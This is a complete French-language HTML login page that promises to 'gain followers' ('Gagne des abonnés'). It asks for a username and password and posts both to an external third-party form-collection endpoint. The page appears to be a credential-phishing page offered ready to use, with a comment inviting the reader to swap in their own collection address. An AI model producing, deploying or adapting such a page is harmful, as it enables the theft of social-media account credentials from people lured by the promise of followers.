<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Connexion — Gagne des abonnés</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0f1724;
      --card:#0b1220;
      --accent:#7c3aed;
      --muted:#9aa4b2;
      --glass: rgba(255,255,255,0.03);
      --success:#16a34a;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:"Inter",system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;
      background:
        radial-gradient(800px 400px at 10% 10%, rgba(124,58,237,0.12), transparent 10%),
        radial-gradient(600px 300px at 90% 90%, rgba(14,165,233,0.06), transparent 10%),
        var(--bg);
      color:#e6eef6;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:32px;
    }

    .container{
      width:100%;
      max-width:420px;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:16px;
      padding:28px;
      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
      border: 1px solid rgba(255,255,255,0.03);
      backdrop-filter: blur(6px);
    }

    .brand{
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:18px;
    }
    .logo{
      width:56px;
      height:56px;
      border-radius:12px;
      background:linear-gradient(135deg, var(--accent), #06b6d4);
      display:flex;
      align-items:center;
      justify-content:center;
      font-weight:700;
      font-size:20px;
      color:white;
      box-shadow: 0 6px 18px rgba(124,58,237,0.18);
    }
    h1{
      margin:0;
      font-size:18px;
      letter-spacing:0.2px;
    }
    p.lead{
      margin:6px 0 20px;
      color:var(--muted);
      font-size:13px;
    }

    form .field{
      margin-bottom:14px;
    }
    label{
      display:block;
      margin-bottom:6px;
      font-size:13px;
      color:var(--muted);
    }
    input[type="text"],
    input[type="password"],
    input[type="email"]{
      width:100%;
      padding:12px 14px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,0.04);
      background:var(--glass);
      color:inherit;
      outline:none;
      font-size:15px;
      transition:box-shadow .15s, border-color .15s;
    }
    input:focus{
      box-shadow: 0 6px 18px rgba(124,58,237,0.12);
      border-color: rgba(124,58,237,0.6);
    }

    .pw-row{
      position:relative;
    }
    .toggle-eye{
      position:absolute;
      right:10px;
      top:50%;
      transform:translateY(-50%);
      background:none;
      border:none;
      color:var(--muted);
      font-size:14px;
      cursor:pointer;
      padding:6px;
      border-radius:8px;
    }
    .hint{
      font-size:12px;
      color:var(--muted);
      margin-top:8px;
    }

    .actions{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
      margin-top:18px;
    }
    .btn{
      flex:1;
      padding:12px 16px;
      border-radius:12px;
      border:0;
      cursor:pointer;
      font-weight:600;
      letter-spacing:0.2px;
    }
    .btn-primary{
      background:linear-gradient(90deg,var(--accent),#06b6d4);
      color:white;
      box-shadow: 0 8px 22px rgba(124,58,237,0.18);
    }
    .btn-ghost{
      background:transparent;
      color:var(--muted);
      border:1px solid rgba(255,255,255,0.03);
    }

    .small{
      font-size:13px;
      color:var(--muted);
      text-align:center;
      margin-top:14px;
    }

    .success{
      color:var(--success);
      font-weight:600;
    }

    @media (max-width:480px){
      .container{padding:20px;border-radius:12px}
      .logo{width:48px;height:48px}
    }

  </style>
</head>
<body>
  <div class="container" role="main">
    <div class="brand">
      <div class="logo">RG</div>
      <div>
        <h1>Gagne des abonnés</h1>
        <p class="lead">Connecte-toi pour continuer — sécurisé et simple.</p>
      </div>
    </div>

    <!-- Formulaire : change l'attribut action si tu veux -->
    <form id="loginForm" action="https://getform.io/f/akkpqvda" method="POST" autocomplete="on" novalidate>
      <div class="field">
        <label for="username">Nom d'utilisateur</label>
        <input id="username" name="username" type="text" placeholder="Ton pseudo" required minlength="2" />
      </div>

      <div class="field pw-row">
        <label for="password">Mot de passe</label>
        <input id="password" name="password" type="password" placeholder="••••••••" required minlength="6" />
        <button type="button" class="toggle-eye" id="togglePw" aria-label="Afficher le mot de passe">Afficher</button>
      </div>

      <div class="hint">Minimum 6 caractères. Ne partage pas ton vrai mot de passe sur des pages publiques.</div>

      <div class="actions">
        <button type="submit" class="btn btn-primary">Se connecter</button>
        <button type="button" class="btn btn-ghost" id="fillDemo">Ex. auto</button>
      </div>

      <div class="small">Tu n'as pas de compte ? <span style="color:var(--accent);font-weight:600">Créer un compte</span></div>
      <div id="msg" class="small" style="display:none;margin-top:10px;"></div>
    </form>
  </div>

  <script>
    // Toggle password visibility
    const pw = document.getElementById('password');
    const toggle = document.getElementById('togglePw');
    toggle.addEventListener('click', () => {
      if (pw.type === 'password') {
        pw.type = 'text';
        toggle.textContent = 'Masquer';
      } else {
        pw.type = 'password';
        toggle.textContent = 'Afficher';
      }
      pw.focus();
    });

    // Demo quick-fill button
    document.getElementById('fillDemo').addEventListener('click', () => {
      document.getElementById('username').value = 'utilisateur_demo';
      pw.value = 'demo1234';
      showMessage('Champs remplis pour démo — clique Se connecter pour envoyer.', false);
    });

    // Simple client-side validation & UX
    const form = document.getElementById('loginForm');
    const msg = document.getElementById('msg');
    function showMessage(text, isError){
      msg.style.display = 'block';
      msg.textContent = text;
      msg.style.color = isError ? '#ff7b7b' : '#8ef3b0';
    }

    form.addEventListener('submit', (e) => {
      e.preventDefault();
      msg.style.display = 'none';
      const username = document.getElementById('username').value.trim();
      const password = pw.value;

      if (username.length < 2) {
        showMessage('Le nom d\'utilisateur est trop court.', true);
        return;
      }
      if (password.length < 6) {
        showMessage('Le mot de passe doit contenir au moins 6 caractères.', true);
        return;
      }

      // Optionnel : affichage d'un petit message avant envoi
      showMessage('Envoi en cours…', false);

      // Envoi réel du formulaire
      form.submit();
    });
  </script>
</body>
</html>
